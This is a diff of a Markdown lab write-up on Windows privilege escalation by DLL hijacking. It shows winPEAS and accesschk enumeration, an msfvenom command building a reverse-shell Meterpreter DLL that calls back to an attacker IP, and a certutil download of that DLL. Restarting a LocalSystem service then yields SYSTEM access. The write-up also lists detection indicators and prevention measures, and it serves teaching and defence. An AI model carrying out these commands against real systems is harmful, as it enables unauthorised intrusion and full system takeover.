@@ -4,7 +4,7 @@
 **Author:** ShahinSecLab<br>
 **Category:** Privilege Escalation<br>
 **Difficulty:** Medium<br>
-**Tools:** msfvenom, Metasploit, winPEAS, accesschk.exe, certutil
+**Tools:** msfvenom, Metasploit, winPEAS, accesschk.exe
 
 # Table of Contents
 
@@ -91,21 +91,20 @@ If a folder early in that search order is writable by normal users, I can drop a
 | `accesschk.exe`  | `/home/kali/Desktop/tools/` | Check service permissions       |
 | `msfvenom`       | Built into Kali           | Generate malicious DLL payload  |
 | `Metasploit`     | Built into Kali           | Catch reverse shells            |
-| `Python3`        | Built into Kali           | Host files over HTTP            |
-
 
 ## Prerequisites
 
-
-
-
-
-
+| What | Why |
+|------|-----|
+| Low privilege Meterpreter session | Starting point for the attack |
+| Writable `C:\Temp` directory | Place the malicious DLL where the service loads it |
+| Permission to start and stop the service | Restart the service to load the DLL |
+| Metasploit | Catch the reverse Meterpreter connection |
+| `certutil` on the victim | Download the DLL from the Kali machine |
 
 ## Step 1 — Finding the DLL Hijacking Opportunity
 
-**I already had a Meterpreter shell on the victim machine as a low privilege user**. I ran winPEAS to scan for privilege escalation paths.
-winPEAS flagged a DLL Hijacking opportunity straight away:
+I already had a Meterpreter shell on the victim machine as a low privilege user. I ran `winPEAS` to scan for privilege escalation paths.
 
 ```bash
 C:\PrivEsc>.\winPEASany.exe
@@ -121,21 +120,24 @@ dllsvc(DLL Hijack Service)["C:\Program Files\DLL Hijack Service\dllhijackservice
 
 ## Step 2 — Checking Service Permissions with accesschk.exe
 
-After finding the vulnerable service, I checked what permissions my current user had on it.
+After finding the `dllsvc` service, I checked the permissions my current user had on that service.
+
 
 ```bash
 C:\PrivEsc> .\accesschk.exe /accepteula -uqcv user dllsvc
 ```
 
-**Flag Breakdown**
+**Breakdown**
 
-
-
-
-
-
-
-
+| Part | Description |
+|------|--------------------------------------------------|
+| `/accepteula` | Accepts the Sysinternals license agreement automatically |
+| `-u` | Shows user account permissions |
+| `-q` | Runs in quiet mode and hides extra information |
+| `-c` | Checks permissions on a Windows service |
+| `-v` | Shows detailed permission information |
+| `user` | The username being checked |
+| `dllsvc` | The service name being checked |
 
 **Output:**
 
@@ -149,11 +151,12 @@ R dllsvc
         SERVICE_STOP
         READ_CONTROL
 ```
+The output showed that my user had permission to start and stop the service.
 
 - `SERVICE_START`: I can start the service
 - `SERVICE_STOP`: I can stop the service
 
-I could stop and restart the service myself — meaning I could trigger the DLL load whenever I wanted.
+Since I could control the service state, I could restart it after placing the malicious DLL file. This would force the service to load the DLL.
 
 <p align="center">
   <img src="images/step2-1.png" width="600">
@@ -161,19 +164,18 @@ I could stop and restart the service myself — meaning I could trigger the DLL 
 
 ## Step 3 — Checking the Service Configuration
 
-After confirming that I could start and stop the service, I checked its configuration.
+After confirming that I could start and stop the service, I checked the service configuration to see how it was running.
 
 ```bash
 C:\PrivEsc> sc qc dllsvc
 ```
-**Flag Breakdown**
+**Breakdown**
 
-
-
-
-
-
-
+| Part | Description |
+|------|--------------------------------------------------|
+| `sc` | Windows Service Control command used to manage services |
+| `qc` | Displays the configuration of a service |
+| `dllsvc` | The name of the service being checked |
 
 **Output:**
 
@@ -191,22 +193,31 @@ SERVICE_NAME: dllsvc
         DEPENDENCIES       : 
         SERVICE_START_NAME : LocalSystem
 ```
+The important part was:
+```
+SERVICE_START_NAME : LocalSystem
+```
+
+This showed that the service was running with `SYSTEM privileges`. If I could make the service load my DLL, the DLL would also run with SYSTEM privileges.
+
 <p align="center">
   <img src="images/step3-1.png" width="600">
 </p>
 
 ### Started the Service
 
+I started the service to confirm that it was working correctly.
+
 ```bash
 C:\PrivEsc>net start dllsvc
 ```
+**Breakdown**
 
-**Flag Breakdown**
-
-
-
-
-
+| Part | Description |
+|---------|--------------------------------------------------|
+| `net` | Windows command used to manage network and service-related functions |
+| `start` | Starts a Windows service |
+| `dllsvc` | The service name to start |
 
 **Output:**
 
@@ -222,16 +233,17 @@ I started the service to confirm it was working and loading DLLs from `C:\Temp`.
 
 ## Step 4 — Generating a Malicious DLL and Downloading it to the Victim
 
-I generated a malicious DLL on my Kali machine using msfvenom. This DLL would connect back to my Metasploit listener when it was loaded by the vulnerable service.
+I generated a malicious DLL on my Kali machine using `msfvenom`. This DLL would connect back to my Metasploit listener when it was loaded by the vulnerable service.
 
 ### Generated a Malicious DLL on Kali
+
 ```bash
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.5.128 LPORT=4444 -f dll -o hijackme.dl
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.5.128 LPORT=4444 -f dll -o hijackme.dll
 ```
 
-**Flag Breakdown**
+**Breakdown**
 
-| Flag  |            Value                    |                         Description                                  |
+| Part  |            Value                    |                         Description                                  |
 |-------|-------------------------------------|----------------------------------------------------------------------|
 | `-p`    | windows/x64/meterpreter/reverse_tcp | Creates a 64-bit Windows Meterpreter reverse TCP payload.            |
 | `LHOST` | 192.168.5.128                       | My Kali machine's IP address that receives the reverse connection.   |
@@ -249,6 +261,8 @@ Payload size: 510 bytes
 Final size of dll file: 9216 bytes
 Saved as: hijackme.dll
 ```
+The DLL file was created successfully and was ready to be moved to the victim machine.
+
 <p align="center">
   <img src="images/step4-1.png" width="600">
 </p>
@@ -276,22 +290,27 @@ run
 
 ### Downloaded the Malicious DLL on the Victim Machine
 
-After starting the Metasploit listener, I downloaded the malicious DLL from my Kali machine to the victim using certutil.
-First, I changed to the Temp directory.
+After starting the Metasploit listener, I downloaded the malicious DLL from my Kali machine to the victim using `certutil`.
+First, I moved to the writable `C:\Temp` directory:
 
 ```bash
 C:\PrivEsc> cd C:\Temp
 ```
-Then I downloaded the DLL.
+Then I downloaded the DLL file:
 
 ```bash
 C:\Temp> certutil -urlcache -split -f http://192.168.5.128/hijackme.dll hijackme.dll
 ```
-**Flag Breakdown**
+**Breakdown**
 
-
-
-
+| Part | Description |
+|------|--------------------------------------------------|
+| `certutil` | Windows built-in utility used to download files |
+| `-urlcache` | Uses the URL cache feature to retrieve the file |
+| `-split` | Splits downloaded files into smaller parts if needed |
+| `-f` | Forces the download even if a file already exists |
+| `http://192.168.5.128/hijackme.dll` | URL of the DLL file hosted on my Kali machine |
+| `hijackme.dll` | Name used to save the DLL on the victim machine |
 
 **Output:**
 
@@ -301,7 +320,7 @@ C:\Temp> certutil -urlcache -split -f http://192.168.5.128/hijackme.dll hijackme
   2400
 CertUtil: -URLCache command completed successfully.
 ```
-The download completed successfully, and the malicious DLL was saved as hijackme.dll on the victim machine.
+The DLL file was downloaded successfully and saved as `hijackme.dll` inside `C:\Temp` on the victim machine.
 
 <p align="center">
   <img src="images/step4-3.png" width="600">
@@ -311,14 +330,18 @@ The download completed successfully, and the malicious DLL was saved as hijackme
 
 ### Stopped the Service
 
+After placing the DLL file in `C:\Temp`, I stopped the service so that it could be restarted and load the DLL file.
+
 ```bash
 C:\Temp> net stop dllsvc
 ```
-**Flag Breakdown**
+**Breakdown**
 
-
-
-
+| Part | Description |
+|---------|--------------------------------------------|
+| `net` | Windows command used to manage services |
+| `stop` | Stops a running service |
+| `dllsvc` | The name of the service being stopped |
 
 **Output:**
 
@@ -328,12 +351,19 @@ The DLL Hijack Service service was stopped successfully.
 
 ### Started the Service Again
 
+I started the service again to trigger the DLL loading process.
+
 ```bash
 net start dllsvc
 ```
 **Flag Breakdown**
+**Breakdown**
 
-
+| Part | Description |
+|---------|--------------------------------------------|
+| `net` | Windows command used to manage services |
+| `start` | Starts a Windows service |
+| `dllsvc` | The name of the service being started |
 
 **Output:**
 
@@ -341,7 +371,11 @@ net start dllsvc
 The DLL Hijack Service service is starting.
 The DLL Hijack Service service was started successfully.
 ```
+When the service started, it loaded the DLL from the writable location. Since the service was running as `LocalSystem`, the DLL also ran with SYSTEM privileges.
+
 ### Metasploit Caught the Connection
+
+On my Kali machine, Metasploit received the reverse connection:
 
 ```
 [*] Started reverse TCP handler on 192.168.5.128:4444 
@@ -350,9 +384,13 @@ The DLL Hijack Service service was started successfully.
 ```
 ### Dropped into a Shell and Checked Privileges
 
+I opened a Windows shell from Meterpreter:
+
 ```bash
 meterpreter > shell
 ```
+Then I checked the current user:
+
 ```bash
 C:\Windows\system32> whoami
 ```
@@ -365,25 +403,68 @@ nt authority\system
   <img src="images/step5-1.png" width="600">
 </p>
 
-I went from a normal low privilege user to `nt authority\system` just by dropping a DLL file into a writable folder and restarting a service.
+The whoami result confirmed that I had SYSTEM level access. The attack worked because the service loaded my DLL from a writable folder while running with `LocalSystem` privileges.
 
 ## How Defenders Can Catch This
+
+| Indicator | What to Look For |
+|-----------|------------------|
+| New DLL files inside writable folders | Monitor folders like `C:\Temp` for unexpected DLL files |
+| Service loading DLL files from unusual locations | Check service configurations and loaded DLL paths |
+| Users starting or stopping sensitive services | Review Windows Service Control Manager logs |
+| A service running as `LocalSystem` loading user-controlled files | Monitor high privilege processes and DLL loads |
+| Unexpected Meterpreter or reverse shell connections | Check firewall logs and network monitoring |
+| Suspicious DLL files created before a service restart | Monitor file creation events and process activity |
 
 
 ## How to Prevent It
 
+### Restrict folder permissions
+
+Make sure normal users cannot write files into folders used by important services.
+
+```powershell
+icacls "C:\Program Files\DLL Hijack Service"
+```
+### Use full DLL paths
+
+Applications should load DLL files from trusted locations instead of depending on the default DLL search order.
+
+### Remove unnecessary service permissions
+
+Normal users should not have permission to start, stop, or modify important services.
+
+### Run services with minimum privileges
+
+Avoid running services as `LocalSystem` unless it is required.
+
+### Monitor DLL loading
+
+Use tools like Sysmon to detect unusual DLL loading from user-writable locations.
+
+### Keep software updated
+
+Install security updates and regularly check installed applications for known issues.
 
 ## References
 
-
-
+| Resource | Link |
+|----------|------|
+| Microsoft — Dynamic-Link Library Search Order | https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order |
+| Microsoft Sysinternals — AccessChk | https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk |
+| Microsoft — Windows Services Security | https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights |
+| HackTricks — Windows DLL Hijacking | https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/dll-hijacking/index.html |
+| MITRE ATT&CK — DLL Search Order Hijacking (T1574.001) | https://attack.mitre.org/techniques/T1574/001/ |
 
 ## Lessons Learned
 
-While working through this attack I realized that:
+While working through this attack, I learned that:
 
-- Windows trusting folders in the PATH to load DLLs is a big security risk
-- If any folder in the DLL search order is writable by normal users, the machine is open to this attack
-- The DLL payload is different from an EXE payload — you have to use -f dll in msfvenom
-- hashdump only works from Meterpreter, not from a CMD shell
-- Once you get a SYSTEM Meterpreter session, you can dump every password hash on the machine in one command
+- A writable folder in the DLL search path can lead to SYSTEM access.
+- Checking service permissions is an important step during Windows privilege escalation.
+- `winPEAS` helped identify the possible DLL Hijacking path quickly.
+- `accesschk.exe` showed that my user could control the service.
+- A service running as `LocalSystem` can make a DLL Hijacking attack more dangerous.
+- `msfvenom` can create DLL files that can be loaded by vulnerable services.
+- Restarting the service forced Windows to load the DLL from the writable location.
+- Small service permission mistakes can allow a normal user to gain full SYSTEM access.
